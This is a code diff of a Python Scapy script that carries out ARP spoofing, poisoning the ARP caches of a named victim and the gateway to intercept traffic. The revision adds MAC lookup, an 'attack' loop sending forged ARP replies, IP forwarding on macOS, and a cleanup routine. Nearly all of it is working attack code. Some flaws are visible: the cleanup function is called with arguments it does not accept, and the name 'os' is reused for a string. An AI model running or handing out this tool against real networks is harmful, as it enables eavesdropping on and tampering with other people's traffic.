@@ -1,19 +1,28 @@
 import sys, os, time
 import platform as platform_module
 import scapy.all as scapy
-from scapy.layers.l2 import getmacbyip as getMac
 
 interface = ""
 victimIP = ""
 gateIP = ""
 
-def spoofer(targetIP, spoofIP):
-    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=getMac(targetIP),psrc=spoofIP)
-    scapy.send(packet, verbose=False)
+def get_MAC(ip, interface):
+	answer, unanswer = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)
+	for send,recieve in answer:
+		return recieve.sprintf(r"%Ether.src%")
 
-def restore(destinationIP, sourceIP):
-    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=getMac(sourceIP))
-    scapy.send(packet, count=4,verbose=False)
+
+def reassignARP():
+	print("[*] Reassigning ARPS...")
+	victimMAC = get_MAC(victimIP, interface)
+	routerMAC = get_MAC(gateIP, interface)
+	scapy.send(scapy.ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))
+	scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))
+	print("[+] Success!")
+
+def attack(victimIP, victimMAC, routerIP, routerMAC):
+	scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
+	scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
 
 def get_input():
 	try:
@@ -54,24 +63,38 @@ def main():
 			print("[!] Fatal Error: Could not enable IP Forwarding")
 			exit(1)
 	elif os == "Windows":
-		print("[!] Error Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
-		exit(1)
+		print("[!] Error: Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
+	elif os == "macosx":
+		os.system('sysctl -w net.inet.ip.forwarding=1')
 	else:
-		print("[!] Error unknown Operating System\n[*] MacOS is not supported\n[!] Exiting...\n")
+		print("[!] Error: unknown Operating System\n[!] Exiting...\n")
 		exit(1)
+	
+	try:
+		victimMAC = get_MAC(victimIP, interface)
+	except Exception as e:
+		print("[!] Error getting victim MAC")
+		print(e)
+		sys.exit(1)
 
 	try:
-		while True:
-			spoofer(victimIP,gateIP)
-			spoofer(gateIP,victimIP)
-			print("\r[+] Sent packets "+ str(packets)),
-			sys.stdout.flush()
-			packets +=2
-			time.sleep(2)
-	except KeyboardInterrupt:
-		print("\n\t[*] Exiting...")
-		restore(victimIP,gateIP)
-		restore(gateIP,victimIP)
+		routerMAC = get_MAC(gateIP, interface)
+	except Exception as e:
+		print("[!] Error getting router MAC")
+		print(e)
+		sys.exit(1)
+	
+	print("[*] Victim MAC: %s" % victimMAC)
+	print("[*] Router MAC: %s" % routerMAC)
+	print("[*] Attacking")
+	while True:
+		try:
+			attack(victimIP, victimMAC, gateIP, routerMAC)
+			time.sleep(1)
+		except KeyboardInterrupt:
+			reassignARP(victimIP, gateIP, interface)
+			break
+	sys.exit(1)
 	
 
 if __name__ == "__main__":
